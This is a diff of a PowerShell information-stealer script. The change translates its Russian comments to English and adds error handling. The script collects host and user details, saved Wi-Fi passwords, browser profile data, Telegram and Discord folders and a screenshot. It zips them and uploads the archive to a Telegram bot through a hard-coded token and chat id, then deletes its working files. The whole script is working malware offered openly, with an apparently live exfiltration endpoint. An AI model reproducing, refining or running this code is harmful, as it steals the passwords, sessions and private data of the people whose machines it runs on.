@@ -1,15 +1,17 @@
-# Исправленный стриллер с тестовым сообщением
+# Stealer with test message
 $T=$env:TEMP+"\stoler_data"
 $Z=$env:TEMP+"\data.zip"
 New-Item -Path $T -ItemType Directory -Force|Out-Null
 
-# ТЕСТОВОЕ СООБЩЕНИЕ (чтобы проверить, что скрипт вообще работает)
-$testUrl="https://api.telegram.org/bot8988262123:AAGULb5xniATGqNC60nCJYrbq_-aIKMHFwQ/sendMessage"
-$testData=@{chat_id='761051987';text='[!] Стиллер запущен на '+(hostname)}
-$testBody=$testData|ConvertTo-Json
-Invoke-RestMethod -Uri $testUrl -Method Post -Body $testBody -ContentType 'application/json' -ErrorAction SilentlyContinue
+# TEST MESSAGE
+try{
+    $testUrl="https://api.telegram.org/bot8988262123:AAGULb5xniATGqNC60nCJYrbq_-aIKMHFwQ/sendMessage"
+    $testData=@{chat_id='761051987';text='[OK] Stealer started on '+(hostname)}
+    $testBody=$testData|ConvertTo-Json
+    Invoke-RestMethod -Uri $testUrl -Method Post -Body $testBody -ContentType 'application/json' -ErrorAction SilentlyContinue
+}catch{}
 
-# Системная информация
+# System info
 $info=@{
     hostname=(hostname)
     user=$env:USERNAME
@@ -18,7 +20,7 @@ $info=@{
 }
 $info|ConvertTo-Json|Out-File "$T\system_info.txt" -Encoding UTF8
 
-# Wi-Fi пароли
+# Wi-Fi passwords
 try{
     $profiles=(netsh wlan show profiles|Select-String ':'|%{$_.ToString().Split(':')[1].Trim()})
     foreach($p in $profiles){
@@ -26,7 +28,7 @@ try{
         if($pass){"$p : $($pass.ToString().Split(':')[1].Trim())"}}|Out-File "$T\wifi.txt" -Encoding UTF8
 }catch{}
 
-# Браузеры
+# Browsers
 $browsers=@{
     Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
     Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
@@ -49,7 +51,7 @@ if(Test-Path $tg){try{Copy-Item $tg "$T\telegram" -Recurse -Force -ErrorAction S
 $dc="$env:APPDATA\discord"
 if(Test-Path $dc){try{Copy-Item $dc "$T\discord" -Recurse -Force -ErrorAction SilentlyContinue}catch{}}
 
-# Скриншот
+# Screenshot
 try{
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing -ErrorAction SilentlyContinue
     $screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -59,12 +61,12 @@ try{
     $bitmap.Save("$T\screenshot.png")
 }catch{}
 
-# Архивация
+# Archive
 try{
     Compress-Archive -Path "$T\*" -DestinationPath $Z -Force -CompressionLevel Optimal -ErrorAction SilentlyContinue
 }catch{}
 
-# Отправка в Telegram (упрощенная, без прокси для надежности)
+# Send to Telegram
 try{
     $url="https://api.telegram.org/bot8988262123:AAGULb5xniATGqNC60nCJYrbq_-aIKMHFwQ/sendDocument"
     $form=New-Object System.Net.Http.MultipartFormDataContent
@@ -80,7 +82,6 @@ try{
     $client.Timeout=[System.TimeSpan]::FromSeconds(60)
     $response=$client.PostAsync($url,$form).Result
     
-    # Лог в файл для отладки
     if($response.StatusCode -eq 200){
         'OK'>>$env:TEMP\stealer.log
     }else{
@@ -90,7 +91,7 @@ try{
     'SendError: '+$_.Exception.Message>>$env:TEMP\stealer.log
 }
 
-# Очистка
+# Cleanup
 try{
     Remove-Item $T -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item $Z -Force -ErrorAction SilentlyContinue
